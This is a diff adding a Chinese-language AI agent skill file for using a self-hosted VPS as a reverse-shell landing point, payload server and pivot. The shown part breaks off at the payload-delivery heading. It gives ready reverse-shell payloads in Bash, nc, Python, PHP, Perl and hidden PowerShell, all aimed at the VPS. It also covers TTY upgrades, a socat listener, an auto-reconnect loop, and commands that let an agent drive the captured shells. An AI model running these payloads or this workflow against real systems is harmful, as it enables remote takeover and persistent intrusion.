@@ -1,1 +1,187 @@
-LS0tCm5hbWU6IHZwcy1yZXZlcnNlLXNoZWxsCmRlc2NyaXB0aW9uOiDnlKjoh6rlu7ogVlBT77yIPOS9oOeahFZQU19JUD7vvIxTU0gg56eB6ZKl55m75b2V77yJ5YGa5Y+N5by5IFNoZWxsIOiQveWcsOS4juS4rei9rO+8mjkwMDAtOTk5OSDnq6/lj6Pnm5HlkKzjgIHpnZ7kuqTkupLkvJror53pqbHliqjjgIHovb3ojbfmipXpgJLjgIHlj43lkJHpmqfpgZMKd2hlblRvVXNlOiDnm67moIfml6Dms5Xlm57ov57mnKzmnLogLyDpnIDopoHlhaznvZHlm7rlrprnm5HlkKznq6/lj6MgLyDpnIDopoHplb/mnJ/lnKjnur/ot7Pmnb8gLyDpnIDopoHorqnmmbrog73kvZPoh6rlt7HkuIvlj5Hlkb3ku6TliLDlj43lvLkgU2hlbGwKcm9sZTogZXhwbG9pdAplbmFibGVkOiB0cnVlCi0tLQoKIyBWUFMg5Lit6L2s5LiO5Y+N5by5IFNoZWxs77yIPOS9oOeahFZQU19JUD7vvIkKCuiHquW7uuWFrOe9kSBWUFMg5L2c5Li6Kirlj43lvLkgU2hlbGwg6JC95Zyw56uvICsg6L296I235oqV6YCS54K5ICsg5YaF572R5Lit6L2s6Lez5p2/KirjgILnm67moIflj6rpnIDopoHog73orr/pl67kupLogZTnvZHvvIwK5oqKIHNoZWxsIOW8ueWIsCBWUFMg55qEIDkwMDAtOTk5OSDnq6/lj6PvvJvmmbrog73kvZPpgJrov4cgdG11eCDkvJror50qKumdnuS6pOS6kuWcsCoq5LiL5Y+R5ZG95Luk5bm26K+75Zue6L6T5Ye644CCCgojIyDkvZXml7bnlKggLyDkvZXml7bkuI3nlKgKCnwg5Zy65pmvIHwg6YCJ5oupIHwKfCAtLS0gfCAtLS0gfAp8IOebruagh+iDveebtOi/nuacrOacuu+8iOWQjOe9keauteOAgeacieWFrOe9kSBJUO+8iSB8IOebtOaOpeacrOacuuebkeWQrO+8jCoq5LiN5b+FKirnlKggVlBTIHwKfCDnm67moIflj6rog73lh7rnvZHjgIHmnKzmnLrlnKjlhoXnvZHvvIhOQVQg5ZCO77yJIHwg4pyFIOeUqCBWUFPvvIzov5nmmK/kuLvlnLrmma8gfAp8IOebruagh+aYr+S6keS4u+acui/lrrnlmajvvIzlh7rnvZHlj5fpmZDkvYbog73lh7ogODAvNDQzIHwg4pyFIOeUqCBWUFMg55qEIDkwMDAtOTk5Oe+8iOiLpeiiq+mZkOWItuWwseeUqCA0NDMvODAg57G756uv5Y+j77yM6KeB5o6S6Zqc77yJIHwKfCDlj6rpnIDopoHot5HkuIDmnaHlkb3ku6Tmi7/nu5PmnpwgfCDkvJjlhYjnlKggV2ViIOa8j+a0ni9SQ0Ug55qEIEhUVFAg6YCa6YGT77yM5q+U5Y+N5by5IHNoZWxsIOabtOeos+abtOmakOiUvSB8CgojIyDotYTkuqfkuI7lh63mja4KCmBgYArkuLvmnLogICAgOiA85L2g55qEVlBTX0lQPu+8iOiFvuiur+S6ke+8jFVidW50dSAyNC4wNO+8jDJDMkfvvIzkuLvmnLrlkI0gPFZQUyDkuLvmnLrlkI0+77yJCueUqOaItyAgICA6IHVidW50de+8iHN1ZG8g5YWN5a+G77yJCuengemSpSAgICA6IH4vLmRzaC9yZWR0ZWFtL3Rvb2xraXQvdnBzL2lkX3JzYSAgICAgICAgICDihpAg5p2D6ZmQIDYwMO+8jOS4jeimgeWkjeWItui/m+S7k+W6ky/ogYrlpKkK5Y+v55So56uv5Y+jOiA5MDAwLTk5OTkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKGkCDkupHlronlhajnu4Tlj6rmlL7kuobov5nkuIDmrrUK5bel5YW36ISa5pysOiB+Ly5kc2gvcmVkdGVhbS90b29sa2l0L3Zwcy92cHMuc2gKYGBgCgoqKuWvhumSpee6quW+iyoq77ya56eB6ZKl5Y+q5Zyo5LiK6Z2i6L+Z5Liq6Lev5b6E44CC5Lu75L2V5oOF5Ya15LiL5LiN6KaB5oqK56eB6ZKl5YaF5a655YaZ6L+b5oqA6IO95paH5Lu244CB5oql5ZGK44CB5LuT5bqT5oiW5a+56K+d44CCCgrlt7Lplb/mnJ/ljaDnlKjnmoTnq6/lj6PvvJoqKjkwMDEgLyA5MDA3IC8gOTAwOe+8iOi/mOacieWFtuS7liA5MDA4IOetieS4tOaXtuacjeWKoe+8iSoq77yM5Y+m5pyJIHRtdXgg5Lya6K+dIGBjYXAgLyBzaCAvIHVwIC8gd3d3YOOAggoqKui/meS6m+S4jeaYr+acrOasoea8lOe7g+eahO+8jOS4jeimgSBraWxs44CB5LiN6KaB6KaG55uW44CCKioKCiMjIOW/q+mAn+W8gOWniwoKYGBgYmFzaApWUFM9fi8uZHNoL3JlZHRlYW0vdG9vbGtpdC92cHMvdnBzLnNoCgokVlBTIHN0YXR1cyAgICAgICAgICAgICAgICAgIyDnnIsgVlBTIOeKtuaAgeOAgeWJqeS9meerr+WPo+OAgeeOsOacieS8muivnQokVlBTIGxpc3RlbiAgICAgICAgICAgICAgICAgIyDoh6rliqjmjJHkuIDkuKrnqbrpl7Lnq6/lj6PlvIDnm5HlkKzvvIjkuZ/lj68gJFZQUyBsaXN0ZW4gOTAwMO+8iQojIOKGkiDmi7/liLDnq6/lj6PlkI7vvIznlKjnm67moIfkuIrnmoTmvI/mtJ7miafooYzlj43lvLnlkb3ku6TvvIjop4HkuIvkuIDoioLvvIkKJFZQUyBzZW5kIDkwMDAgJ2lkOyB1bmFtZSAtYScgICAgICAjIOebruagh+Wbnui/nuWQju+8jOS4i+WPkeWRveS7pAokVlBTIHJlYWQgOTAwMCA2MCAgICAgICAgICAgICAgICAgICMg6K+75Zue6L6T5Ye6CiRWUFMga2lsbCA5MDAwICAgICAgICAgICAgICAgICAgICAgIyDnlKjlrozlv4XpobvmuIXnkIYKYGBgCgpgbGlzdGVuYCDnlKggdG11eCArIHJsd3JhcCArICoq6Ieq5Yqo6YeN5ZCs5b6q546vKirvvJrov57mjqXmlq3kuobkvJroh6rliqjph43mlrDnm5HlkKzvvIzpgILlkIjlj43lpI3op6blj5HjgIIKCiMjIOW3peWFt+eUqOazle+8iHZwcy5zaO+8iQoKfCDlrZDlkb3ku6QgfCDkvZznlKggfAp8IC0tLSB8IC0tLSB8CnwgYHN0YXR1c2AgfCBWUFMg6Lqr5Lu944CB57O757uf44CB5bel5YW35bCx57uq5oOF5Ya144CBOTAwMC05OTk5IOWNoOeUqOOAgXRtdXgg5Lya6K+dIHwKfCBgcG9ydGAgfCDoh6rliqjov5Tlm57kuIDkuKogOTAwMC05OTk5IOWGheeahOepuumXsuerr+WPoyB8CnwgYGxpc3RlbiBbcG9ydF1gIHwg5byA5oyB5LmF55uR5ZCs77yI55yB55Wl56uv5Y+j5YiZ6Ieq5Yqo6YCJ77yJ77yM5omT5Y2w55uu5qCH5L6n5ZG95Luk5qih5p2/IHwKfCBgc2Vzc2lvbnNgIHwg5YiX5Ye6IFZQUyDkuIrnmoQgdG11eCDkvJror50gfAp8IGBzZW5kIDxwb3J0PiAnPGNtZD4nYCB8ICoq5oqK5ZG95Luk5LiL5Y+R6L+b5bey5LiK57q/55qE5Y+N5by5IFNoZWxsKirvvIjmmbrog73kvZPkuLvnlKjvvIkgfAp8IGByZWFkIDxwb3J0PiBb6KGM5pWwXWAgfCDor7vlm57or6XkvJror53mnIDov5HovpPlh7rvvIjpu5jorqQgMjAwIOihjO+8iSB8CnwgYHdhdGNoIDxwb3J0PmAgfCDmjIHnu63liLfmlrDovpPlh7rvvIjkurrnnIvvvIkgfAp8IGBhdHRhY2ggPHBvcnQ+YCB8IOacrOacuiB0bXV4IOaOpeeuoeS8muivne+8iOS6uueUqO+8jGBDdHJsLUIgRGAg6YCA5Ye677yJIHwKfCBga2lsbCA8cG9ydD5gIHwg5YWz6Zet55uR5ZCsICsg5riF55CG5Lya6K+dICsg6YeK5pS+56uv5Y+jIHwKfCBgc2VydmUgW3BvcnRdIFtkaXJdYCB8IFZQUyDkuIrotbcgSFRUUCDmnI3liqHvvIzkvpvnm67moIfkuIvovb3ovb3ojbfvvIjpu5jorqQgOTAwOO+8iSB8CnwgYHB1c2ggPOacrOWcsD4gW+i/nOerr11gIHwg5LiK5Lyg5paH5Lu25YiwIFZQUyB8CnwgYGdldCA86L+c56uvPiBb5pys5ZywXWAgfCDku44gVlBTIOWPluWbnuaWh+S7tu+8iOaKiuebruagh+S6p+eJqeaLieWbnuadpe+8iSB8CnwgYHNoICc85ZG95LukPidgIHwg5ZyoIFZQUyDkuIrnm7TpgJrmiafooYzku7vmhI/lkb3ku6QgfAoK546v5aKD5Y+Y6YeP5Y+v6KaG55uW77yaYFZQU19IT1NUYOOAgWBWUFNfS0VZYOOAggoKIyMg55uu5qCH5L6n5Y+N5by5IHBheWxvYWTvvIjnq6/lj6PmjaLmiJDkvaAgbGlzdGVuIOeahOmCo+S4qu+8iQoKYGBgYmFzaAojIEJhc2jvvIjmnIDluLjnlKjvvIkKYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC885L2g55qEVlBTX0lQPi85MDAwIDA+JjEnCmJhc2ggLWMgJ2V4ZWMgYmFzaCAtaSAmPi9kZXYvdGNwLzzkvaDnmoRWUFNfSVA+LzkwMDAgPCYxJwoKIyBuYyDns7vvvIjmnIkgLWUg55qE54mI5pys77yJCm5jIDzkvaDnmoRWUFNfSVA+IDkwMDAgLWUgL2Jpbi9iYXNoCnJtIC1mIC90bXAvZjsgbWtmaWZvIC90bXAvZjsgY2F0IC90bXAvZiB8IC9iaW4vYmFzaCAtaSAyPiYxIHwgbmMgPOS9oOeahFZQU19JUD4gOTAwMCA+IC90bXAvZgoKIyBQeXRob27vvIjml6AgbmMg5pe255qE5YWc5bqV77yM5YW85a65IHB5dGhvbjIvM++8iQpweXRob24zIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiPOS9oOeahFZQU19JUD4iLDkwMDApKTtbb3MuZHVwMihzLmZpbGVubygpLGYpIGZvciBmIGluICgwLDEsMildO3N1YnByb2Nlc3MuY2FsbChbIi9iaW4vYmFzaCIsIi1pIl0pJwoKIyBQSFDvvIhXZWIg5L6nIGdldHNoZWxsIOWQjuW4uOeUqO+8iQpwaHAgLXIgJyRzPWZzb2Nrb3BlbigiPOS9oOeahFZQU19JUD4iLDkwMDApO2V4ZWMoIi9iaW4vYmFzaCAtaSA8JjMgPiYzIDI+JjMiKTsnCgojIFBlcmwKcGVybCAtZSAndXNlIFNvY2tldDskaT0iPOS9oOeahFZQU19JUD4iOyRwPTkwMDA7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2Nvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSk7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7JwoKIyBXaW5kb3dzIFBvd2VyU2hlbGwKcG93ZXJzaGVsbCAtbm9wIC13IGhpZGRlbiAtYyAiJGM9TmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzzkvaDnmoRWUFNfSVA+Jyw5MDAwKTskcz0kYy5HZXRTdHJlYW0oKTtbYnl0ZVtdXSRiPTAuLjY1NTM1fCV7MH07d2hpbGUoKCRpPSRzLlJlYWQoJGIsMCwkYi5MZW5ndGgpKSAtbmUgMCl7JGQ9KE5ldy1PYmplY3QgVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGIsMCwkaSk7JHI9KGlleCAkZCAyPiYxfE91dC1TdHJpbmcpOyRyMj0kcisnUFMgJysocHdkKS5QYXRoKyc+ICc7JHNiPShbVGV4dC5FbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkcjIpOyRzLldyaXRlKCRzYiwwLCRzYi5MZW5ndGgpfSIKYGBgCgoqKlVSTCDnvJbnoIEqKu+8mui1sCBXZWIg5ryP5rSe77yI5ZG95Luk5rOo5YWlL1JDRe+8ieaXtuaKiiBwYXlsb2FkIOaVtOS9kyBVUkwg57yW56CB5ZCO5YaN5Lyg5Y+C77yM6YG/5YWNIGAmYOOAgWA+YCDooqvmiKrmlq3jgIIKCiMjIOS8muivneWNh+e6p+S4jueos+WumuWMlgoK6KO4IGBuY2Ag5Ye65p2l55qEIHNoZWxsIOayoeaciSBUVFnvvJrkuI3og70gYHN1ZG9g44CB5LiN6IO9IGBzdWDjgIFgdmlgIOWSjCBgdG9wYCDkvJrlvILluLjjgILljYfnuqfvvJoKCmBgYGJhc2gKIyDnm67moIfkuIrmiafooYzvvIhweXRob24zIOW/heijheeOh+acgOmrmO+8iQpweXRob24zIC1jICdpbXBvcnQgcHR5O3B0eS5zcGF3bigiL2Jpbi9iYXNoIiknCiMg5oiWCnNjcmlwdCAtcWMgL2Jpbi9iYXNoIC9kZXYvbnVsbApgYGAKCmBgYGJhc2gKIyDmnKzmnLrkvqfvvIhhdHRhY2gg5ZCO77yJ6K6pIEN0cmwtQy/mlrnlkJHplK7mraPluLgKIyDlnKjlj43lvLkgc2hlbGwg6YeM5L6d5qyh77yaQ3RybC1aCnN0dHkgcmF3IC1lY2hvOyBmZwojIOWbnui9puS4pOasoe+8jOeEtuWQjgpleHBvcnQgVEVSTT14dGVybTsgZXhwb3J0IFNIRUxMPS9iaW4vYmFzaDsgc3R0eSByb3dzIDQwIGNvbHMgMTYwCmBgYAoKKirmm7TnqLPnmoTmlrnmoYjvvJpzb2NhdCDlhaggVFRZIOebkeWQrCoq77yIVlBTIOS4iuW3suijhSBzb2NhdO+8ie+8mgoKYGBgYmFzaAokVlBTIHNoICJ0bXV4IG5ldy1zZXNzaW9uIC1kIC1zIHJ0LXB0eSAtdCAnJyAnc29jYXQgZmlsZTpcYHR0eVxgLHJhdyxlY2hvPTAgdGNwLWxpc3Rlbjo5MDAwLHJldXNlYWRkciciCiMg55uu5qCH5L6nCnNvY2F0IGV4ZWM6J2Jhc2ggLWxpJyxwdHksc3RkZXJyLHNldHNpZCxzaWdpbnQsc2FuZSB0Y3A6POS9oOeahFZQU19JUD46OTAwMApgYGAKCuaOiee6v+iHquWKqOmHjei/nu+8iOebruagh+S+p+W+queOr++8ie+8mgoKYGBgYmFzaAp3aGlsZSB0cnVlOyBkbyBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzzkvaDnmoRWUFNfSVA+LzkwMDAgMD4mMSc7IHNsZWVwIDEwOyBkb25lICYKYGBgCgojIyDovb3ojbfmipXpgJLvvIhWUFMg5b2T5paH5Lu25Lit6L2s77yJCgpgYGBiYXNoCiRWUFMgc2VydmUgOTEwMCB+L3J0L3BheWxvYWRzICAgICAgICAjIFZQUyDkuIrotbcgSFRUUCDmnI3liqEKJFZQUyBwdXNoIC4vc3VvNSAvaG9tZS91YnVudHUvcnQvcGF5bG9hZHMvCiMg55uu5qCH5L6n77yITGludXjvvIkKY3VybCAtTyBodHRwOi8vPOS9oOeahFZQU19JUD46OTEwMC9zdW81ICDmiJYgIHdnZXQgaHR0cDovLzzkvaDnmoRWUFNfSVA+OjkxMDAvc3VvNQojIOebruagh+S+p++8iFdpbmRvd3PvvIkKY2VydHV0aWwgLXVybGNhY2hlIC1zcGxpdCAtZiBodHRwOi8vPOS9oOeahFZQU19JUD46OTEwMC9iZWFjb24uZXhlIEM6XFdpbmRvd3NcVGVtcFxhLmV4ZQpwb3dlcnNoZWxsIC1jICJpd3IgaHR0cDovLzzkvaDnmoRWUFNfSVA+OjkxMDAvYmVhY29uLmV4ZSAtT3V0RmlsZSBDOlxXaW5kb3dzXFRlbXBcYS5leGUiCmBgYAoKKirlj5blm57miJjliKnlk4EqKu+8mmAkVlBTIGdldCAvaG9tZS91YnVudHUvcnQvbG9vdC9kdW1wLnppcCB+Ly5kc2gvcmVkdGVhbS9lbmdhZ2VtZW50cy886Z225qCHPi9ydW5zL2AKCiMjIOWPjeWQkemap+mBk+S4juS4rei9rAoK55uu5qCH5Zyo5YaF572R44CB5pys5py65LiN5Y+v6L6+5pe277yM55SoIFZQUyDlvZPot7Pmnb/vvJoKCmBgYGJhc2gKIyDlj43lkJHpmqfpgZPvvJpWUFM6OTIwMCDihpIg55uu5qCH5YaF572RIDEwLjAuMC41OjgwODDvvIjlnKjnm67moIfkuIrmiafooYzvvIkKc3NoIC1SIDkyMDA6MTAuMC4wLjU6ODA4MCAtTiAtZiAtbyBTdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLWkgPOebruagh+S4iueahOWvhumSpT4gdWJ1bnR1QDzkvaDnmoRWUFNfSVA+CiMg5LmL5ZCO5pys5py657uPIFZQUyDorr/pl67vvJpzc2ggLUwgODA4MDoxMjcuMC4wLjE6OTIwMCB1YnVudHVAPOS9oOeahFZQU19JUD4KCiMgc29jYXQg56uv5Y+j6L2s5Y+R77yIVlBTIOS4iu+8iQokVlBTIHNoICJ0bXV4IG5ldy1zZXNzaW9uIC1kIC1zIGZ3ZC05MjAwICdzb2NhdCBUQ1AtTElTVEVOOjkyMDAscmV1c2VhZGRyLGZvcmsgVENQOjEwLjAuMC41OjgwODAnIgpgYGAKCldlYlNoZWxsIOWcuuaZr+mFjeWQiOaKgOiDvSBgc3VvNS10dW5uZWxg77ya5oqKIHN1bzUg5a6i5oi356uv5pS+5pys5py677yM5pyN5Yqh56uv5Lyg5Yiw55uu5qCH77yM6Zqn6YGT5Ye65Y+j57uPIFZQUyDmm7TnqLPjgIIKCiMjIOe6quW+i++8iOWKoeW/hemBteWuiO+8iQoKMS4gKirnq6/lj6PnuqrlvosqKu+8muWPqueUqCA5MDAwLTk5OTnvvIzlvIDnm5HlkKzliY3lhYggYCRWUFMgcG9ydGAg5oiWIGAkVlBTIHN0YXR1c2Ag56Gu6K6k56m66Zey77ybKirnu53kuI3ljaDnlKgv5p2A5o6JIDkwMDHjgIE5MDA344CBOTAwOSDkuI4gYGNhcC9zaC91cC93d3dgIOS8muivnSoq44CCCjIuICoq5q+P5qyh55So5a6M5b+F6aG7IGAkVlBTIGtpbGwgPHBvcnQ+YCoq77yM5LiN6KaB55WZ5LiL6KO455uR5ZCs77yI5pei5piv6LWE5rqQ5Y2g55So5Lmf5piv55eV6L+577yJ44CCCjMuICoq5Yet5o2u6JC95bqT44CB5LiN55WZIFZQUyoq77ya55uu5qCH5LiK5oqT5Yiw55qE5Y+j5LukL+WTiOW4jOeUqCBgcmVkdGVhbV9jcmVkZW50aWFsX2FkZGAg5YaZ6L+b5pys5py66LWE5Lqn5bqT77yI5piO5paHIGBzZWNyZXRfdmFsdWVg77yJ77yM5Lqn54mp6JC95pys5py6IGBydW5zL2DvvJsqKuS4jeimgeaKiuWHreaNruWGmei/myBWUFMg5a6255uu5b2VKirjgIIKNC4gKipWUFMgSVAg5a+555uu5qCH5Y+v6KeBKirvvJrlroPlsZ7kuo7mnKzmrKHmvJTnu4PnmoTln7rnoYDorr7mlr3vvIzkuI3opoHlnKjnm67moIfkuIrnlZnkuIvljIXlkKvlroPkuYvlpJbnmoTpop3lpJbkuKrkurrkv6Hmga/jgIIKNS4gKirokL3lupMqKu+8muavj+asoeaIkOWKn+aLv+WIsCBzaGVsbCDnlKggYHJlZHRlYW1fYWNjZXNzX2FkZGAg6K6w5b2V77yIaG9zdC/otKblj7cv5pa55byPL+adg+mZkC/kvJror53lvJXnlKjvvInvvIzmr4/mnaHlh63mja7nlKggYHJlZHRlYW1fY3JlZGVudGlhbF9hZGRgIOiusOW9le+8jOaUu+WHu+iEmuacrOeUqCBgcmVkdGVhbV9hdHRhY2tfZmlsZV9hZGRgIOW9kuaho+OAggo2LiAqKmBzZW5kYCDlh7rljrvnmoTmr4/mnaHlkb3ku6Tpg73opoHog73ku44gYHJlYWRgIOeahOi+k+WHuumHjOaLv+WIsOivgeaNrioq77yM6YeN6KaB6L6T5Ye65YWI6YeN5a6a5ZCR5Yiw5paH5Lu25YaNIGBnZXRgIOWbnuadpe+8jOmBv+WFjSB0bXV4IOWbnua7mue8k+WGsuiiq+WIt+aOieOAggoKIyMg5o6S6ZqcCgp8IOeOsOixoSB8IOWkhOeQhiB8CnwgLS0tIHwgLS0tIHwKfCDnm67moIflm57ov57kuI3kuIogfCDlhYjnoa7orqTnm5HlkKznnJ/lnKjvvJpgJFZQUyBzZXNzaW9uc2AgKyBgJFZQUyBzaCAic3MgLWx0bnAgXHwgZ3JlcCA8cG9ydD4iYO+8m+WGjeehruiupOebruagh+WHuue9ke+8iOebruagh+S4iiBgY3VybCAtcyBodHRwOi8vPOS9oOeahFZQU19JUD46PHBvcnQ+YCDoi6Xov5Tlm57ov57mjqXmiJDlip/or7TmmI7nq6/lj6Plj6/ovr7vvIkgfAp8IOerr+WPo+WcqOiMg+WbtOWkli/mjaLnq6/lj6MgfCDkupHlronlhajnu4Tlj6rmlL7kuoYgOTAwMC05OTk577yM6LaF6IyD5Zu05b+F5aSx6LSlIHwKfCDlj43lpI3mjonnur8gfCDnm67moIfkvqfliqAgYHdoaWxlIHRydWVgIOmHjei/nuW+queOr++8m+aIlueUqCBzb2NhdCDlhaggVFRZIOaWueahiCB8Cnwg5pyJ5Zue5pi+5L2G5ZG95Luk5LiN5omn6KGMIHwgcGF5bG9hZCDooqsgVVJMIOaIquaWre+8iGAmYC9gPmDvvInvvIzmlbTkvZMgVVJMIOe8lueggSB8Cnwg5Lit5paH5Lmx56CBIHwg55uu5qCH5LiKIGBleHBvcnQgTEFORz1DLlVURi04YO+8jOaIluWFiCBgcmVhZGAg5YmN5oqKIHRtdXgg6K6+572uIGB0bXV4IHNldCAtdCBydC08cG9ydD4gdXRmOCBvbmAgfAp8IOaXoCBUVFnjgIFgc3Vkb2Ag5oql6ZSZIHwg5Y2H57qnIFBUWe+8iOingeS4iu+8iSB8Cnwg5pys5py65o6i5rWL56uv5Y+jIuWFqOmDqOWPr+i/niIgfCDmnKzmnLrnvZHlhbPkvJrlr7nku7vmhI/nq6/lj6Plm54gU1lOLUFDS++8jCoq5pys5py6IGBuYyAtemAg5LiN6IO95Yik5patIFZQUyDnq6/lj6Plj6/ovr7mgKcqKu+8m+imgeeUqOWklumDqOiKgueCueaIluebruagh+acrOi6q+mqjOivgSB8CgojIyDkuI7lhbbku5bmioDog73nmoTlhbPns7sKCi0gYHN1bzUtdHVubmVsYO+8mldlYlNoZWxsIOKGkiBTT0NLUzUg6Zqn6YGT77yM5Ye65Y+j5Y+v5Lul6LWw5pysIFZQUwotIGB3ZWJzaGVsbC10b29sa2l0YO+8muWGsOidji/lk6Xmlq/mi4kv6JqB5YmR77yM5ou/5YiwIFdlYlNoZWxsIOWQjueahOeuoeeQhgotIGBjbi1wcm94eS1wb29sYO+8mumcgOimgeWbveWGheWHuuWPoyBJUCDml7blj6DliqDku6PnkIbvvIjkuI3opoHmlLnliqjmnKzmnLrnvZHnu5zphY3nva7vvIkKLSBgYWN0aXZlLXNjYW5gIC8gYGZvZmEtcmVjb25g77ya5YaF572R5Y+v6L6+5ZCO57un57ut5rWL57uYCg==
+---
+name: vps-reverse-shell
+description: 用自建 VPS（<你的VPS_IP>，SSH 私钥登录）做反弹 Shell 落地与中转：9000-9999 端口监听、非交互会话驱动、载荷投递、反向隧道
+whenToUse: 目标无法回连本机 / 需要公网固定监听端口 / 需要长期在线跳板 / 需要让智能体自己下发命令到反弹 Shell
+role: exploit
+enabled: true
+---
+
+# VPS 中转与反弹 Shell（<你的VPS_IP>）
+
+自建公网 VPS 作为**反弹 Shell 落地端 + 载荷投递点 + 内网中转跳板**。目标只需要能访问互联网，
+把 shell 弹到 VPS 的 9000-9999 端口；智能体通过 tmux 会话**非交互地**下发命令并读回输出。
+
+## 何时用 / 何时不用
+
+| 场景 | 选择 |
+| --- | --- |
+| 目标能直连本机（同网段、有公网 IP） | 直接本机监听，**不必**用 VPS |
+| 目标只能出网、本机在内网（NAT 后） | ✅ 用 VPS，这是主场景 |
+| 目标是云主机/容器，出网受限但能出 80/443 | ✅ 用 VPS 的 9000-9999（若被限制就用 443/80 类端口，见排障） |
+| 只需要跑一条命令拿结果 | 优先用 Web 漏洞/RCE 的 HTTP 通道，比反弹 shell 更稳更隐蔽 |
+
+## 资产与凭据
+
+```
+主机    : <你的VPS_IP>（腾讯云，Ubuntu 24.04，2C2G，主机名 <VPS 主机名>）
+用户    : ubuntu（sudo 免密）
+私钥    : ~/.dsh/redteam/toolkit/vps/id_rsa          ← 权限 600，不要复制进仓库/聊天
+可用端口: 9000-9999                                   ← 云安全组只放了这一段
+工具脚本: ~/.dsh/redteam/toolkit/vps/vps.sh
+```
+
+**密钥纪律**：私钥只在上面这个路径。任何情况下不要把私钥内容写进技能文件、报告、仓库或对话。
+
+已长期占用的端口：**9001 / 9007 / 9009（还有其他 9008 等临时服务）**，另有 tmux 会话 `cap / sh / up / www`。
+**这些不是本次演练的，不要 kill、不要覆盖。**
+
+## 快速开始
+
+```bash
+VPS=~/.dsh/redteam/toolkit/vps/vps.sh
+
+$VPS status                 # 看 VPS 状态、剩余端口、现有会话
+$VPS listen                 # 自动挑一个空闲端口开监听（也可 $VPS listen 9000）
+# → 拿到端口后，用目标上的漏洞执行反弹命令（见下一节）
+$VPS send 9000 'id; uname -a'      # 目标回连后，下发命令
+$VPS read 9000 60                  # 读回输出
+$VPS kill 9000                     # 用完必须清理
+```
+
+`listen` 用 tmux + rlwrap + **自动重听循环**：连接断了会自动重新监听，适合反复触发。
+
+## 工具用法（vps.sh）
+
+| 子命令 | 作用 |
+| --- | --- |
+| `status` | VPS 身份、系统、工具就绪情况、9000-9999 占用、tmux 会话 |
+| `port` | 自动返回一个 9000-9999 内的空闲端口 |
+| `listen [port]` | 开持久监听（省略端口则自动选），打印目标侧命令模板 |
+| `sessions` | 列出 VPS 上的 tmux 会话 |
+| `send <port> '<cmd>'` | **把命令下发进已上线的反弹 Shell**（智能体主用） |
+| `read <port> [行数]` | 读回该会话最近输出（默认 200 行） |
+| `watch <port>` | 持续刷新输出（人看） |
+| `attach <port>` | 本机 tmux 接管会话（人用，`Ctrl-B D` 退出） |
+| `kill <port>` | 关闭监听 + 清理会话 + 释放端口 |
+| `serve [port] [dir]` | VPS 上起 HTTP 服务，供目标下载载荷（默认 9008） |
+| `push <本地> [远端]` | 上传文件到 VPS |
+| `get <远端> [本地]` | 从 VPS 取回文件（把目标产物拉回来） |
+| `sh '<命令>'` | 在 VPS 上直通执行任意命令 |
+
+环境变量可覆盖：`VPS_HOST`、`VPS_KEY`。
+
+## 目标侧反弹 payload（端口换成你 listen 的那个）
+
+```bash
+# Bash（最常用）
+bash -c 'bash -i >& /dev/tcp/<你的VPS_IP>/9000 0>&1'
+bash -c 'exec bash -i &>/dev/tcp/<你的VPS_IP>/9000 <&1'
+
+# nc 系（有 -e 的版本）
+nc <你的VPS_IP> 9000 -e /bin/bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <你的VPS_IP> 9000 > /tmp/f
+
+# Python（无 nc 时的兜底，兼容 python2/3）
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<你的VPS_IP>",9000));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/bash","-i"])'
+
+# PHP（Web 侧 getshell 后常用）
+php -r '$s=fsockopen("<你的VPS_IP>",9000);exec("/bin/bash -i <&3 >&3 2>&3");'
+
+# Perl
+perl -e 'use Socket;$i="<你的VPS_IP>";$p=9000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
+
+# Windows PowerShell
+powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('<你的VPS_IP>',9000);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
+```
+
+**URL 编码**：走 Web 漏洞（命令注入/RCE）时把 payload 整体 URL 编码后再传参，避免 `&`、`>` 被截断。
+
+## 会话升级与稳定化
+
+裸 `nc` 出来的 shell 没有 TTY：不能 `sudo`、不能 `su`、`vi` 和 `top` 会异常。升级：
+
+```bash
+# 目标上执行（python3 必装率最高）
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# 或
+script -qc /bin/bash /dev/null
+```
+
+```bash
+# 本机侧（attach 后）让 Ctrl-C/方向键正常
+# 在反弹 shell 里依次：Ctrl-Z
+stty raw -echo; fg
+# 回车两次，然后
+export TERM=xterm; export SHELL=/bin/bash; stty rows 40 cols 160
+```
+
+**更稳的方案：socat 全 TTY 监听**（VPS 上已装 socat）：
+
+```bash
+$VPS sh "tmux new-session -d -s rt-pty -t '' 'socat file:\`tty\`,raw,echo=0 tcp-listen:9000,reuseaddr'"
+# 目标侧
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<你的VPS_IP>:9000
+```
+
+掉线自动重连（目标侧循环）：
+
+```bash
+while true; do bash -c 'bash -i >& /dev/tcp/<你的VPS_IP>/9000 0>&1'; sleep 10; done &
+```
+
+## 载荷投递（VPS 当文件中转）
+
+```bash
